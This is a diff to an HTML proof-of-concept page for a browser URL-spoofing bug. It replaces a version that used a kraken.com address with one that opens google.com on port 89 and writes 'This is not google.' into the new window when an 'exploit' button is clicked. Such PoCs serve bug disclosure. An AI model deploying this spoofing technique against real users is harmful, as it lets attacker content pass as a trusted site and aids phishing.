@@ -4,22 +4,17 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Kraken</title>
+  <title>PoC</title>
   <script> 
     function spoof(){    
-location = "https://www.kraken.com:89";
-location = "https://www.kraken.com:89";
-    const content = document.getElementById('content');
-    const newParagraph = document.createElement('p');
-    newParagraph.textContent = 'This is not Kraken website.';
-    content.appendChild(newParagraph);
     const submitBtn = document.getElementById('submitButton');
     submitBtn.remove();
+    let x = window.open("https://www.google.com:89");
+    x.document.write("This is not google.");    
     };
   </script>
 </head>
 <body>
   <input id="submitButton" type="button" value="exploit" onclick="spoof();" />
-  <div id="content"></div>
 </body>
 </html>
